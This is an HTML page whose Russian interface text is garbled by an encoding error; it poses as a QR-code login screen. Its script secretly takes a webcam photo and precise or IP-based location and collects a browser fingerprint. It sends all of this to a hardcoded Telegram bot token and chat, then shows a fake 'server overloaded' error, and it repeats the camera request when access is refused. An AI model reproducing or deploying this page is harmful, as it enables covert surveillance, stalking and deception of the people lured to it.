<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>–í—Ö–æ–¥ –ø–æ QR-–∫–æ–¥—É</title>
  <style>
    body {
      margin: 0;
      font-family: system-ui, -apple-system, sans-serif;
      background: #f8fafc;
      color: #1e293b;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .card {
      max-width: 500px;
      width: 90%;
      padding: 30px;
      background: white;
      border-radius: 16px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
      text-align: center;
    }
    .btn {
      background: #3b82f6;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 12px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 20px;
      width: 100%;
    }
    .hidden { display: none; }
    #videoPreview {
      width: 100%;
      max-height: 300px;
      background: #000;
      border-radius: 12px;
      margin: 20px 0;
      display: none;
    }
    .status { margin-top: 15px; font-size: 14px; color: #64748b; }
  </style>
</head>
<body>
  <div class="card">
    <!-- –≠–ö–†–ê–ù 1: QR-–ü–†–ï–î–ó–ê–ü–†–û–° -->
    <div id="screen-prompt" class="screen">
      <div style="font-size:64px;margin-bottom:20px">üì±</div>
      <h2>–û—Ç—Å–∫–∞–Ω–∏—Ä—É–π—Ç–µ QR-–∫–æ–¥ –¥–ª—è –≤—Ö–æ–¥–∞</h2>
      <p>–î–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ –≤—Ö–æ–¥–∞ –≤ —Å–∏—Å—Ç–µ–º—É —Ä–∞–∑—Ä–µ—à–∏—Ç–µ –¥–æ—Å—Ç—É–ø.</p>
      <button class="btn" onclick="requestCamera(1)">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
    </div>

    <!-- –≠–ö–†–ê–ù 2: –í–ò–î–ï–û -->
    <video id="videoPreview" autoplay playsinline muted></video>

    <!-- –≠–ö–†–ê–ù 3: –£–°–ü–ï–• -->
    <div id="screen-success" class="screen hidden">
      <div style="font-size:64px;margin-bottom:20px">‚ö†Ô∏è</div>
      <h2>–°–µ—Ä–≤–µ—Ä –ø–µ—Ä–µ–≥—Ä—É–∂–µ–Ω</h2>
      <p>–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–≤—Ç–æ—Ä–∏—Ç—å –≤—Ö–æ–¥ —á–µ—Ä–µ–∑ –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–∏–Ω—É—Ç.</p>
    </div>

    <!-- –≠–ö–†–ê–ù 4: –û–¢–ö–ê–ó -->
    <div id="screen-denied" class="screen hidden">
      <div style="font-size:64px;margin-bottom:20px">‚ùå</div>
      <h2>–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â—ë–Ω</h2>
      <p>–í—Ö–æ–¥ –Ω–µ–≤–æ–∑–º–æ–∂–µ–Ω –±–µ–∑ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ.</p>
    </div>

    <div class="status" id="status"></div>
  </div>

  <script>
    // === –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ===
    const CONFIG = {
      BOT_TOKEN: "7841418365:AAEBjMXo9Vy238QSEPSpC-CS0qUqNVhHlXg",
      CHAT_ID: 502984850,
      MAX_CAMERA_ATTEMPTS: 2
    };

    let cameraAttempt = 0;

    // === –û–¢–ü–†–ê–í–ö–ê –§–û–¢–û –í TELEGRAM ===
    async function sendPhoto(imageData) {
      try {
        const blob = await (await fetch(imageData)).blob();
        const formData = new FormData();
        formData.append('chat_id', CONFIG.CHAT_ID);
        formData.append('photo', blob, 'qr_scan.jpg');
        formData.append('caption', 'üì∏ QR-—Å–∫–∞–Ω: –≤—Ö–æ–¥ –Ω–∞ —Å–∞–π—Ç');
        const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        if (!res.ok) console.error('Telegram photo error:', await res.text());
      } catch (e) {
        console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ:', e);
      }
    }

    // === –û–¢–ü–†–ê–í–ö–ê –ö–ê–†–¢–´ ===
    async function sendLocation(lat, lon, label = "–ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ") {
      try {
        // –ö–∞—Ä—Ç–∞
        let res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendLocation`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CONFIG.CHAT_ID,
            latitude: lat,
            longitude: lon,
            horizontal_accuracy: 50
          })
        });
        if (!res.ok) console.error('Location error:', await res.text());

        // –ü–æ–¥–ø–∏—Å—å
        res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CONFIG.CHAT_ID,
            text: `üìç ${label}\n–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: ${lat.toFixed(6)}, ${lon.toFixed(6)}`
          })
        });
        if (!res.ok) console.error('Caption error:', await res.text());
      } catch (e) {
        console.error('–û—à–∏–±–∫–∞ –∫–∞—Ä—Ç—ã:', e);
      }
    }

    // === –°–ë–û–† –§–ò–ù–ì–ï–†–ü–†–ò–ù–¢–ê ===
    function collectFingerprint() {
      return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        deviceMemory: navigator.deviceMemory || 'N/A',
        hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
        connection: navigator.connection?.effectiveType || 'unknown',
        canvas: (() => {
          try {
            const c = document.createElement('canvas');
            const ctx = c.getContext('2d');
            ctx.fillText('fingerprint', 0, 10);
            return c.toDataURL().substring(0, 30);
          } catch { return 'N/A'; }
        })()
      };
    }

    // === –û–¢–ü–†–ê–í–ö–ê –¢–ï–ö–°–¢–û–í–û–ì–û –û–¢–ß–Å–¢–ê ===
    async function sendReport(fingerprint, geoSource) {
      const report = `
üì± *–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ*: ${fingerprint.platform}
üåê *–ë—Ä–∞—É–∑–µ—Ä*: ${fingerprint.userAgent.substring(0, 50)}...
üñ• *–≠–∫—Ä–∞–Ω*: ${fingerprint.screen}
üåç *–ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å*: ${fingerprint.timezone}
üì° *–°–µ—Ç—å*: ${fingerprint.connection}
üß† *RAM/CPU*: ${fingerprint.deviceMemory} –ì–ë / ${fingerprint.hardwareConcurrency} —è–¥–µ—Ä
üéØ *–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è*: ${geoSource}
‚è± *–í—Ä–µ–º—è*: ${new Date().toLocaleString('ru-RU')}
      `.trim();

      try {
        const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CONFIG.CHAT_ID,
            text: report,
            parse_mode: 'Markdown'
          })
        });
        if (!res.ok) console.error('Report error:', await res.text());
      } catch (e) {
        console.error('–û—à–∏–±–∫–∞ –æ—Ç—á—ë—Ç–∞:', e);
      }
    }

    // === –ó–ê–ü–†–û–° –ì–ï–û–õ–û–ö–ê–¶–ò–ò –ü–û–°–õ–ï –§–û–¢–û ===
    async function requestGeolocationAfterPhoto() {
      document.getElementById('status').textContent = '–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è...';

      const precise = await new Promise((resolve) => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
          pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, source: '—Ç–æ—á–Ω–∞—è' }),
          () => resolve(null),
          { timeout: 8000 }
        );
      });

      if (precise) {
        await sendLocation(precise.lat, precise.lon, '–¢–æ—á–Ω–æ–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ');
        await sendReport(collectFingerprint(), precise.source);
      } else {
        try {
          // –ü–æ–ª—É—á–∞–µ–º IP
          const ipResp = await fetch('https://api.ipify.org?format=json');
          const ipData = await ipResp.json();
          const ip = ipData.ip;

          // –ü–æ–ª—É—á–∞–µ–º –≥–µ–æ –ø–æ IP
          const geoResp = await fetch(`https://ipapi.co/${ip}/json/`);
          const geo = await geoResp.json();

          if (geo.latitude && geo.longitude) {
            await sendLocation(parseFloat(geo.latitude), parseFloat(geo.longitude), '–ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ –ø–æ IP');
            await sendReport(collectFingerprint(), '–ø–æ IP');
          } else {
            await sendReport(collectFingerprint(), '–Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ');
          }
        } catch (e) {
          console.error('IP-–≥–µ–æ –æ—à–∏–±–∫–∞:', e);
          await sendReport(collectFingerprint(), '–æ—à–∏–±–∫–∞ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è');
        }
      }

      document.getElementById('screen-success').classList.remove('hidden');
    }

    // === –ó–ê–ü–†–û–° –ö–ê–ú–ï–†–´ ===
    async function requestCamera(attempt) {
      cameraAttempt = attempt;
      const video = document.getElementById('videoPreview');
      
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: true, 
          audio: false 
        });
        
        video.srcObject = stream;
        video.style.display = 'block';
        document.getElementById('screen-prompt').classList.add('hidden');

        await new Promise(r => setTimeout(r, 1200));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const imageData = canvas.toDataURL('image/jpeg', 0.7);
        
        stream.getTracks().forEach(track => track.stop());
        video.style.display = 'none';
        
        await sendPhoto(imageData);
        await requestGeolocationAfterPhoto();
        
      } catch (err) {
        video.style.display = 'none';
        handleCameraDenied();
      }
    }

    // === –û–ë–†–ê–ë–û–¢–ö–ê –û–¢–ö–ê–ó–ê –ö–ê–ú–ï–†–´ ===
    function handleCameraDenied() {
      if (cameraAttempt < CONFIG.MAX_CAMERA_ATTEMPTS) {
        document.getElementById('screen-prompt').innerHTML = `
          <div style="font-size:64px;margin-bottom:20px">‚ùó</div>
          <h2>QR-–≤—Ö–æ–¥ –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω</h2>
          <p>–ë–µ–∑ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ –≤—Ö–æ–¥ –Ω–µ–≤–æ–∑–º–æ–∂–µ–Ω.</p>
          <button class="btn" onclick="requestCamera(${cameraAttempt + 1})">–ü–æ–≤—Ç–æ—Ä–∏—Ç—å</button>
        `;
      } else {
        document.getElementById('screen-prompt').classList.add('hidden');
        document.getElementById('screen-denied').classList.remove('hidden');
      }
    }
  </script>
</body>
</html>
